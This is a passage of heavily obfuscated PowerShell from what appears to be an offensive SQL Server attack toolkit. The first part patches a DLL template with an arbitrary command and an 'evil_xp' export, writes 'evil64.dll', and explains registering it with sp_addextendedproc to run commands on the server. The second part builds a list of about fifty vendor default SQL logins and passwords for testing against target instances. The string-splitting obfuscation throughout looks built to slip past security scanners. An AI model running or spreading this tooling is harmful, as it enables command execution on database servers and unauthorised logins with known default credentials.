ACEME!R','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','R','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','E!R','!REPLACEME!REPLACEME!REPLACEME','ACEME!REPLAC','!REPLACEME!REPL','EME!REPL','CEME!REP','AC','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','ME!REPLACEM','LACEME!REPLACEME!RE','EME!REPLACEME!RE','EPLACEME!REPLACEME!REPLACEME!','PL','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','ME!RE','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','ACEME!REPLACEME!REPLACEME!REPLA','EME!REPLACEME!REP','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','ACEME!RE','CEME!REPLACEME!REPLACEME!REPLAC','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','PLACEME!REP','LACEME!RE','PLACEME!REPL','LACE','CEME!REPLACEME!REPLAC','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','LACEME!REPLACEME','EPLACEME!REPLACEME!REPLACEME','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!','!REPLACEME!REPLAC','ME!REPLACEME!REPLACEME!','LACEME!REPLACEME!REPLAC','E!REPL','LACEME!REPLACEME!RE','!R','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','LACEM','PLACEME!REPLACEME!REP','REP','!REPLACEME!REPL','LA','ME','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','ACEME!REPLACEME!REPLACEME!REPLACE','LACEME!REPLACEME!R','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!','PLACEME!REPLACE','EPLACEME!REPLACEME!REPL','!REPL','EPLACEME!REP','M','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','EPLACEME!REPLACEME!REPLACEME!','ACEME!RE','EME!REPLACEME!RE','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!','EME!REPLACEME!REPLACEME!REPLACEME!RE','EME!REPLACEME!REPLA','E!REPLA','ACEME!REPLACEME!REPL','LACEME!REPLACEME!RE','REPLACEME!REPLACEME!REP','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','LACEME!R','LACEME!REPLACEME!REPLACE','EPLACE','PLAC','PLACEME!REP','PLACEME!REPLACEME!REPLACEME!R','CEME!REPLACEME!REPL','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','PLACEME!REPLACEME!R','EPLACEME!R','E!REPLACEME!REPLACEME!REPLACEME!','LACEME','E!REPLACEME!REPLACEME!RE','EME!REPLACEME!REPLACEME!REPL','EME!','ACEME!REP','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','LACEME!REPLACEME!R','CEME')

    
    
    

    
    IF(-not(${c`o`MmaNd}))
    {
        ${cOMM`An`d`St`RInG} = ((("{6}{2}{9}{0}{1}{8}{4}{7}{5}{3}"-f 'a',' t','s','&& REM',':H4h','st.txt ','echo This i','tempH4hte','est. > c',' '))."re`P`lACE"('H4h',[sTring][CHAR]92))
    }
    else
    {
        ${CoMMAn`D`strING} = ("$Command "+'&'+'& '+'R'+'EM')
    }

    
    ${Bu`FfERsT`Ri`NG`len} = ${b`U`FfE`Rstr`ING}."lEN`GTH"

    
    ${Co`mm`ANDsTRi`NglEn} = ${co`m`M`AN`dstriNg}."L`eN`GTh"

    
    if (${CoMmA`NDS`T`R`Inglen} -gt ${BU`Ffe`Rs`TRIngLEN})
    {
        &("{2}{0}{1}" -f'e-Warni','ng','Writ') -Message ("{4}{0}{1}{2}{5}{3}" -f'Co','m','mand i','long!',' ','s too ')
        Break
    }
    else
    {
        ${Buf`Fl`E`NdIFf} = ${bu`F`FeRs`TrING`lEN} - ${Co`M`m`AnDSt`RInG`lEn}
        ${N`E`wbuffER} = ' ' * ${b`UfF`Lend`IFF}
        ${c`OmMA`NdsTRi`Ng} = ("$CommandString "+'&&'+' '+'REM'+' '+"$NewBuffer")
    }

    
    ${cOM`MaN`D`StringBYteS} = (  ( geT-VARIABLe 80zn3).VaLue::"u`Tf8").("{2}{0}{1}" -f'tByt','es','Ge').Invoke(${coMma`Nd`STR`INg})

    
    ${s} =  ( vARiablE 80ZN3  ).vaLUe::"aS`CIi"."GET`St`R`ING"(${dL`lBYt`Es})

    
    ${iN`d`EX} = 0

    
    ${i`N`Dex} = ${s}.("{1}{2}{0}"-f'Of','Inde','x').Invoke(${B`UffErS`TRINg})

    if((${I`NdEX} -eq 0) -and (${I`N`DEX} -ne -1))
    {
        throw(('Could'+' '+'not'+' '+'f'+'ind '+'strin'+'g '+"$BufferString "+'!'))
        Break
    }
    else
    {
        &("{1}{2}{0}"-f '-Verbose','Wri','te') -Message (' '+'Fou'+'nd '+'b'+'uffer '+'offse'+'t'+' '+'f'+'or '+'c'+'om'+'mand: '+"$Index")
    }

    
    for (${I} = 0; ${i} -lt ${COMMaN`DS`TRiNGB`YtEs}."lEN`g`TH"; ${I}++)
    {
        ${DLl`B`ytEs}[${I`NDEx}+${i}] = ${cOMmAN`D`strInG`ByTES}[${I}]
    }

    
    
    
    ${p`Roc`NA`M`EBUfFeR} = ("{2}{0}{3}{1}"-f'LE','L','EVILEVILEVILEVI','VI')

    
    IF(-not(${e`Xpo`RTN`AmE}))
    {
        ${ExPO`R`TNAme} = ("{1}{0}{2}"-f'_','xp','evil')
    }

    
    ${pRo`cnAm`e`BUFFERLen} = ${proc`N`Am`ebufFEr}."LENg`TH"
    ${eXpORtNAMe`L`EN} = ${e`x`port`NAMe}."le`NG`TH"
    If (${pRo`CNameb`UF`FErLEn} -lt ${Ex`porT`Nam`el`eN})
    {
        &("{2}{0}{1}"-f'rit','e-Warning','W') -Message ("{5}{1}{7}{8}{6}{9}{0}{3}{4}{2}"-f'name i','T','o long!','s ','to',' ','func','h','e ','tion ')
        Break
    }
    else
    {
        ${prO`cbuFfLEn`dI`FF} = ${PROCn`AmEBuF`Fe`RLen} - ${EXpO`RTNa`Me`LEN}
        ${pRoc`Ne`WB`UfFER} = '' * ${P`RoCBU`FF`LeN`DIFF}
        
    }

    
    ${proC`I`NdEX} = 0

    
    ${S`2} =   ( gEt-varIaBlE  ('80'+'Zn3') -VALuE)::"asc`ii"."ge`TS`Tri`Ng"(${dL`lbYT`ES})

    ${pr`ociN`DEx} = ${S`2}.("{0}{1}"-f'I','ndexOf').Invoke(${Proc`NAM`EB`UFfeR})

    
    if((${PR`O`cinDeX} -eq 0) -and (${Pr`ociN`dEX} -ne -1))
    {
        throw(('C'+'ould '+'n'+'ot '+'fin'+'d '+'s'+'tr'+'ing '+"$ProcNameBuffer!"))
        Break
    }
    else
    {
        &("{2}{0}{1}{3}" -f 'rite-','Verb','W','ose') -Message (' '+'F'+'o'+'und '+'bu'+'ff'+'er '+'offs'+'et '+'fo'+'r '+'f'+'unct'+'ion '+'name'+': '+"$ProcIndex")
    }

    
    ${e`xp`OrtNAme`By`TEs} = (  ( GcI ("vari"+"AbL"+"e:80"+"Z"+"N3") ).vALUe::"u`Tf8").("{1}{0}"-f 'Bytes','Get').Invoke(${eX`pO`RTNa`ME})

    
    for (${i} = 0; ${i} -lt ${eXpo`RTN`AM`eb`YtES}."L`ENGTH"; ${i}++)
    {
        ${d`L`lbytES}[${Pr`o`ci`Ndex}+${i}] = ${Ex`pOR`TnamE`By`TEs}[${I}]
    }

    
    ${NUll`O`FfSET} = ${p`ROCINd`ex}+${eX`PoRTNa`me`leN}
    &("{2}{1}{0}" -f'e-Verbose','t','Wri') -Message (' '+'Fou'+'nd '+'buffer'+' '+'o'+'ffset '+'fo'+'r '+'b'+'uffer: '+"$NullOffset")
    ${N`UlLByt`es} = ( (ItEM  ("vari"+"aBle:80"+"zN"+"3")).VALUe::"UT`F8").("{0}{1}" -f'Get','Bytes').Invoke(${pRo`C`NEwBuFfeR})

    
    for (${i} = 0; ${i} -lt ${P`R`ocBUFf`lENDi`FF}; ${i}++)
    {
        ${d`l`Lbyt`ES}[${NULL`of`F`seT}+${I}] = ${nul`LBYT`Es}[${i}]
    }

    
    
    

    IF(-not(${OU`TF`ILE}))
    {
        ${Ou`TFIlE} = ((("{1}{2}{0}"-f 'l','.9zVevil6','4.dl')) -REPLacE'9zV',[cHAR]92)
    }

    &("{2}{1}{0}{3}" -f'e-Ver','it','Wr','bose') -Message ('C'+'reating'+' '+'D'+'LL '+"$OutFile")
    &("{1}{0}{2}" -f 'rite-Verbo','W','se') -Message (' '+'- '+'E'+'xporte'+'d '+'fun'+'c'+'tion'+' '+'n'+'ame: '+"$ExportName")
    &("{3}{0}{1}{2}"-f'-V','erbo','se','Write') -Message (' '+'- '+'Exp'+'orted'+' '+'f'+'unc'+'tio'+'n '+'com'+'mand:'+' '+"`"$Command`"")
    &("{3}{2}{1}{0}" -f'se','Verbo','ite-','Wr') -Message (' '+'- '+'M'+'anual '+'te'+'st'+': '+'ru'+'n'+'dll32 '+"$OutFile,$ExportName")
    &("{2}{0}{1}"-f '-Conten','t','Set') -Value ${dlL`BY`Tes} -Encoding ("{1}{0}"-f 'te','By') -Path ${OU`TFI`LE}
    &("{0}{2}{1}"-f'Write-V','rbose','e') -Message ("{0}{2}{3}{1}" -f ' - ','n','DLL ','writte')

    &("{0}{1}{2}"-f'W','rite-','Verbose') -Message ' '
    &("{3}{0}{2}{1}" -f'r','se','ite-Verbo','W') -Message ("{4}{1}{2}{3}{0}" -f 's','QL',' Serv','er Note','S')
    &("{1}{0}{2}{3}"-f 'e-V','Writ','erbos','e') -Message ("{25}{23}{19}{9}{10}{12}{4}{14}{15}{16}{3}{24}{2}{20}{8}{11}{26}{27}{6}{22}{13}{18}{0}{5}{21}{17}{7}{1}" -f 'ocedure. Op','w:','a','st','unct','tions ','ded','o','r ','o','rted','ext',' f','ed','io','n can be ','regi','l',' pr','e exp',' SQL Serve','be',' stor','h','ered as ','T','e','n')
    &("{0}{1}{3}{2}{4}"-f'Wri','t','-Verbo','e','se') -Message (' '+'- '+'R'+'e'+'gi'+'ster '+'x'+'p '+'vi'+'a '+'l'+'ocal'+' '+'dis'+'k: '+'sp_a'+'ddexten'+'d'+'edproc '+"`'$ExportName`', "+('{1}c'+':{'+'0}temp{0'+'}my'+'xp.d'+'ll'+'{1}')  -f[CHAR]92,[CHAR]39)
    &("{0}{2}{3}{1}{4}"-f 'W','Verbos','r','ite-','e') -Message (' '+'- '+'Re'+'giste'+'r'+' '+'xp'+' '+'via'+' '+'UNC'+' '+'p'+'at'+'h: '+'s'+'p_adde'+'xtend'+'ed'+'proc '+"`'$ExportName`', "+"`'\\servername\pathtofile\myxp.dll`'")
    &("{0}{3}{1}{2}"-f'W','-Verb','ose','rite') -Message (' '+'- '+'U'+'n'+'regis'+'ter '+'xp'+': '+'sp_d'+'ro'+'pextend'+'edpr'+'oc '+"`'$ExportName`'")
}






Function  gEt-sq`LseRVE`R`lo`ginDEFau`lTpw
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandatOry = ${Fal`SE},
                VaLUEfRoMPIPElINeByPrOPERTYNaMe = ${t`RUE},
        hELPMeSsaGE = {"{8}{1}{7}{4}{0}{5}{10}{6}{9}{2}{3}" -f'instan',' ','o','.','r ','c','cti','Serve','SQL','on t','e to conne'})]
        [string]${in`S`TaNce},

        [Parameter(maNDatoRy = ${f`ALSE},
        HELpMESsaGe = {"{4}{2}{12}{7}{3}{9}{14}{5}{11}{8}{10}{13}{1}{0}{6}" -f 'p','n is wra','pres','rbose ','Sup','ors.','ped.',' ve','when f','er','unct','  Used ','s','io','r'})]
        [switch]${s`UP`preSS`VeRBOsE}
    )

    Begin
    {
        
        ${tblRe`S`UL`Ts} = &("{2}{0}{1}" -f 'e','ct','New-Obj') -TypeName ("{2}{0}{4}{3}{1}" -f'tem.D','.DataTable','Sys','ta','a')
        ${tBL`REsu`Lts}."C`OLu`mnS".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}" -f 'Compu','te','r')) | &("{1}{2}{0}" -f'ull','O','ut-N')
        ${T`BlR`Esults}."CoL`U`mNs".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}"-f 'Ins','tance')) | &("{2}{1}{0}"-f'Null','ut-','O')
        ${tBLrE`S`UlTs}."c`OLum`NS".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}"-f'ame','Usern')) | &("{0}{1}" -f'Out-Nu','ll')
        ${t`BLRES`UL`Ts}."c`o`LUMns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}" -f'Passwo','rd')) | &("{0}{2}{1}" -f 'Out-Nu','l','l') 
        ${t`B`L`REsulTS}."ColUM`NS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}"-f'I','SysAdmin','s')) | &("{2}{0}{1}"-f'ut-','Null','O')

        
        ${DEf`Aul`TpassW`OrDs} = &("{2}{1}{0}"-f 'ject','Ob','New-') ("{0}{4}{5}{3}{1}{2}" -f'Syst','.DataTa','ble','a','e','m.Dat')
        ${dEfau`ltP`ASsW`OrDs}."c`OLUm`NS".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}" -f 'I','e','nstanc')) | &("{0}{1}" -f 'Out','-Null')
        ${DeFaULtpasSw`o`R`DS}."coL`UmnS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}" -f 'e','User','nam')) | &("{1}{2}{0}"-f'Null','O','ut-')
        ${dE`FAUltpa`S`Sw`Or`Ds}."cO`lUmnS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{2}"-f'asswo','P','rd')) | &("{1}{0}{2}"-f 't','Ou','-Null')        

        
        ${D`eFAU`LtpaSswO`R`Ds}."R`OWS".("{1}{0}" -f 'd','Ad').Invoke("ACS","ej","ej") | &("{1}{2}{0}"-f'ull','Out','-N')
        ${dEfAu`Lt`pasS`Wor`dS}."r`owS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}" -f'A','CT7'),"sa",("{0}{1}" -f's','age')) | &("{1}{2}{0}" -f'l','O','ut-Nul')
        ${D`e`FauL`TP`ASSWorDS}."R`OwS".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}"-f'AO','M2'),("{0}{1}"-f 'ad','min'),("{0}{1}" -f 'c','a_admin')) | &("{1}{2}{0}" -f 'll','out','-nu')
        ${DeFAu`lT`pasSWor`Ds}."R`OwS".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}"-f'S','ARI'),("{1}{0}"-f 'S9','ARI'),("{1}{2}{0}{3}" -f'm9','*','ARIS!1d','n#')) | &("{2}{0}{1}" -f'ut-nul','l','o')
        ${dEfAu`L`TPAssW`Or`Ds}."ro`ws".("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{2}{1}" -f 'A','ault','odeskV','ut'),"sa",("{1}{0}{3}{5}{4}{2}" -f'tod','Au','6200','eskV','@2','ault')) | &("{0}{1}{2}" -f'Ou','t-Nul','l')      
        ${DE`Fa`ULtpaSSw`O`R`ds}."rO`ws".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}" -f'C','HSQL','BOS'),"sa",("{1}{0}{3}{2}"-f'l','RPSsq','5','1234')) | &("{2}{1}{0}"-f 'l','Nul','Out-')
        ${d`Ef`AUL`TpASSwOr`DS}."ro`Ws".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f 'SERVER9','B','PA'),"sa",("{3}{0}{2}{1}" -f 'eB','A9','P','AutoMat')) | &("{2}{0}{1}"-f'ut-Nul','l','O')
        ${d`Ef`AulTP`AsSWOrds}."ro`ws".("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}"-f'CDR','ICOM','D'),"sa",("{0}{2}{1}" -f 'CDR','50!','Dicom')) | &("{0}{2}{1}" -f'Out-','ull','N')
        ${D`EfaU`lTPAs`sWORds}."R`OWS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}"-f'DEPAL','C','O'),"sa",("{0}{2}{1}"-f'Co','@l','d3p')) | &("{2}{1}{0}" -f'ull','t-N','Ou')
        ${dEfau`LT`p`AS`SwoRDs}."Ro`ws".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}"-f'L08','CODEPA'),"sa",("{0}{1}"-f'Cod3p@','l')) | &("{2}{1}{0}"-f'l','ul','Out-N')
        ${dEFaul`T`PA`S`swOrDS}."r`OWs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{3}{2}"-f 'Cou','nterPoi','t','n'),"sa",("{2}{3}{0}{1}"-f 'terP','oint8','C','oun')) | &("{0}{2}{1}"-f 'Ou','Null','t-')
        ${DE`Fault`pasS`WoRdS}."RO`Ws".("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}"-f 'C','5','SSQL0'),("{0}{1}" -f 'ELNAd','min'),("{1}{2}{0}"-f 'min','E','LNAd')) | &("{1}{0}{2}" -f 't-Nul','Ou','l')
        ${de`FA`UltP`AsSWOR`Ds}."r`ows".("{0}{1}"-f'A','dd').Invoke(("{0}{1}" -f'CS','SQL05'),"sa",("{2}{1}{3}{4}{0}"-f'SA','brid','Cam','geSoft','_')) | &("{1}{0}"-f 'l','Out-Nul')
        ${d`EfaUl`TPaSSW`OR`Ds}."RO`ws".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}" -f 'CA','DSQL'),("{2}{1}{0}" -f 'QLAdminUser','S','CAD'),("{4}{2}{0}{3}{1}" -f 'g1','!','r41','sth3M4n','C')) | &("{2}{1}{0}" -f'l','ut-Nul','O')  
        ${DeF`A`ULtpAssw`o`RdS}."rO`wS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{0}{2}"-f'EASY','D','SHIP','HL'),"sa",("{2}{1}{0}" -f 'in@1','dm','DHLa')) | &("{1}{0}" -f '-Null','Out')
        ${DEFAUlTpAS`sW`oR`ds}."rO`WS".("{0}{1}" -f 'A','dd').Invoke("DPM",("{0}{1}"-f 'adm','in'),("{0}{2}{1}"-f'ca_','n','admi')) | &("{2}{0}{1}"-f'ul','l','out-n')
        ${DEFaul`T`PAS`sWOr`dS}."RO`ws".("{1}{0}" -f'dd','A').Invoke(("{1}{0}"-f'VTEL','D'),"sa","") | &("{2}{1}{0}" -f'-Null','t','Ou')
        ${dEf`Au`Lt`Pa`sSwoRDs}."R`OWS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}" -f'EA','S','YSHIP'),"sa",("{1}{2}{0}"-f '@1','DHL','admin')) | &("{1}{0}" -f 'Null','Out-')
        ${dE`Fa`UL`Tpasswor`Ds}."R`Ows".("{1}{0}" -f 'dd','A').Invoke("ECC","sa",("{1}{0}{2}{3}"-f'i','Webg','lit','y2011')) | &("{0}{1}{2}"-f 'Out-','Nul','l')
        ${defauLTP`As`Sw`Or`DS}."r`OWS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}"-f 'ECOPYD','B'),("{0}{2}{1}{3}" -f'e','0py2007_@','+C','x'),("{1}{0}{2}{3}"-f 'C0','e+','py2007','_@x')) | &("{2}{1}{0}"-f'-Null','ut','O')
        ${Defaul`T`PASswOR`ds}."R`OwS".("{1}{0}"-f'dd','A').Invoke(("{1}{2}{0}"-f'DB','ECO','PY'),"sa",("{0}{1}" -f 'ec','opy')) | &("{0}{1}{2}"-f'O','ut-','Null')
        ${DeF`AulTpA`ssW`o`Rds}."ro`Ws".("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}{3}"-f'on201','Emer','s','2'),"sa",("{0}{2}{1}{3}" -f'4','e','2Em','rson42Eme')) | &("{0}{1}{2}"-f'Out-N','ul','l')
        ${d`efaU`l`TpAsSWoR`ds}."R`oWs".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}" -f 'DPS','H'),"sa","sa") | &("{1}{0}"-f'll','Out-Nu')
        ${De`FaU`lTPaSswO`RDs}."ro`wS".("{0}{1}" -f'A','dd').Invoke(("{0}{1}" -f'HPDS','S'),"sa",("{0}{2}{1}{3}" -f 'Hp','00','dsdb','0001')) | &("{1}{0}"-f '-Null','Out')
        ${DEfa`ULT`Pa`ssW`o`RDs}."rO`Ws".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}"-f'PDSS','H'),"sa",("{1}{0}"-f 's','hpds')) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
        ${dEfaUltpa`S`sW`oRds}."rO`Ws".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}"-f'IN','SE','RTGT'),"msi",("{0}{1}{2}"-f 'k','eyb','oa5')) | &("{1}{2}{0}"-f'Null','O','ut-')
        ${De`FaU`LtP`Asswo`RDs}."RO`Ws".("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}"-f'SERTGT','N','I'),"sa","") | &("{0}{2}{1}" -f'O','t-Null','u')
        ${DeFauL`T`pAS`SWORds}."R`OWs".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}" -f'IN','VET','TRA'),"sa",("{3}{1}{2}{0}"-f'ster#1','e','b','W')) | &("{1}{2}{0}"-f '-Null','O','ut')
        ${D`EfauL`Tp`AsSwoR`Ds}."RO`wS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f 'MYMOV','IES'),"sa",("{1}{3}{2}{0}"-f 'nuHA7','t','ra','9A')) | &("{1}{0}{2}" -f'Nu','Out-','ll')
        ${dEf`AU`L`TPAssWOrdS}."ro`wS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}"-f 'PCAME','RICA'),"sa",("{1}{0}{2}" -f'r1c','pcAme','a')) | &("{0}{1}{2}"-f'O','ut-Nul','l')
        ${DEfaultpASS`WO`R`DS}."R`OWS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f 'MERI','CA','PCA'),"sa",("{3}{2}{1}{0}" -f 'ica','mer','CA','P')) | &("{1}{0}{2}" -f'ut-N','O','ull')
        ${D`EFAUltP`As`sWO`RDS}."ro`wS".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}" -f 'RISM','P'),"sa",("{0}{3}{1}{2}" -f 'Se','tyMaster','08','curi')) | &("{2}{1}{0}"-f'Null','t-','Ou')
        ${DefAuLTPAS`Sw`o`RdS}."ro`ws".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f'RMSQL','DATA'),("{1}{0}" -f'r','Supe'),("{0}{1}{2}" -f'Oran','g','e')) | &("{1}{0}{2}" -f't-n','ou','ull')
        ${DEf`AU`ltp`A`SSWORds}."rO`ws".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}"-f 'L','RTCLOCA'),"sa",("{1}{2}{0}" -f 'sword','myp','as')) | &("{2}{1}{0}"-f'ull','N','Out-')
        ${De`F`AuL`TPaSSwo`RDS}."R`OWS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f 'RBA','T'),"sa",(('34TJ'+'4@#po'+'C')."rEPL`A`cE"(([chAR]112+[chAR]111+[chAR]67),[sTrinG][chAR]36))) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
        ${dEfA`ULT`paS`Swor`dS}."r`Ows".("{0}{1}" -f'Ad','d').Invoke("RIT","sa",(('34TJ4@#5Q'+'P')."re`pLacE"(([cHAr]53+[cHAr]81+[cHAr]80),'$'))) | &("{0}{1}"-f'Ou','t-Null')
        ${def`A`UL`TPASSWoRdS}."r`ows".("{1}{0}" -f'dd','A').Invoke("RCO","sa",((('34TJ4@#n'+'g'+'9')  -CrEPlacE ([CHAR]110+[CHAR]103+[CHAR]57),[CHAR]36))) | &("{0}{1}" -f'Out-Nu','ll')
        ${DEF`AuLtpAsSWo`R`ds}."RO`WS".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f'AM','R','EDBE'),"sa",((('3'+'4TJ4@#Ad'+'T') -crEplAcE ([Char]65+[Char]100+[Char]84),[Char]36))) | &("{2}{0}{1}" -f'Nu','ll','Out-')
        ${D`efAUlt`PAS`swo`Rds}."Ro`WS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{3}{1}"-f'SAL','X','ESL','OGI'),"sa",("{2}{1}{0}"-f'er','ast','SLXM')) | &("{0}{1}{2}"-f 'Out-N','ul','l')
        ${defAul`TpAs`s`woRds}."Ro`WS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}" -f 'SI','QL','DEXIS_S'),"sa",("{2}{0}{1}"-f'BeCh','anged','2')) | &("{1}{0}"-f'ut-Null','O')
        ${D`e`FaUltp`ASSW`oRDS}."R`owS".("{0}{1}"-f'A','dd').Invoke(("{1}{0}" -f'K5','SQL2'),("{0}{1}" -f'o','vsd'),("{1}{0}"-f'vsd','o')) | &("{2}{0}{1}" -f'ut-Nul','l','O')
        ${d`Ef`A`U`ltp`ASsWorDs}."RO`ws".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}"-f'SQL','RESS','EXP'),("{0}{1}"-f'admi','n'),("{2}{0}{1}"-f'mi','n','ca_ad')) | &("{1}{2}{0}" -f'-null','o','ut')
        
        
        
        ${dE`F`AULtpaS`S`WoRDS}."Ro`Ws".("{0}{1}" -f'A','dd').Invoke(("{4}{2}{0}{3}{1}"-f 'D','DEV2014','AN','ARD','ST'),("{0}{1}" -f't','est'),("{0}{1}"-f 'te','st')) | &("{0}{1}{2}"-f 'Out-','Nu','ll') 
        ${De`FAu`L`TpaSsw`or`DS}."r`oWS".("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{0}{3}"-f'R','TE','W_SQLEXP','ESS'),"tew","tew") | &("{1}{2}{0}" -f '-Null','Ou','t')
        ${de`F`Aultp`A`s`swOrds}."R`owS".("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}" -f'l','lect','voco'),("{1}{2}{0}" -f'llect','vo','co'),("{2}{0}{1}" -f'c','t','vocolle')) | &("{1}{2}{0}"-f 'l','Out','-Nul')
        ${DEfaul`TpaSSW`O`R`DS}."R`OwS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f'TNET','VSDO'),"sa","") | &("{2}{0}{1}"-f't-','Null','Ou')
        ${dEfauLT`Pa`SSW`oRds}."r`oWS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f'VS','QL'),"sa","111") | &("{0}{1}{2}"-f 'Ou','t-','Null')
        ${D`Ef`AuLT`PaS`Sw`ordS}."Ro`WS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}" -f'AS','C','EWISE'),"sa","") | &("{1}{0}{2}" -f 'ut-Nu','O','ll')
        ${d`eFAultP`AsSw`oR`ds}."ro`WS".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}"-f'AGE','T','VAN'),"sa",("{0}{1}{2}" -f 'va','ntage','12!')) | &("{1}{2}{0}"-f 'ull','Out-','N')
        ${d`Efa`ULTpASsw`OrdS}."RO`ws".("{0}{1}"-f 'A','dd').Invoke("BCM",("{2}{1}{0}"-f 'ser','cmdbu','b'),("{2}{0}{1}" -f'c','muser@06','B')) | &("{2}{0}{1}"-f 't','-Null','Ou')
        ${DE`FauLTPASsw`O`RdS}."Ro`Ws".("{0}{1}" -f'A','dd').Invoke("BCM",("{1}{2}{0}"-f'buser','bcm','d'),("{0}{2}{1}" -f 'Numar','@06','a')) | &("{2}{0}{1}"-f '-','Null','Out')
        ${DEfaUltPAsS`w`OR`dS}."R`owS".("{0}{1}"-f'A','dd').Invoke(("{3}{1}{2}{0}" -f'A','EXIS','_DAT','D'),"sa",("{1}{0}"-f's','dexi')) | &("{2}{0}{1}" -f 'Nul','l','Out-')
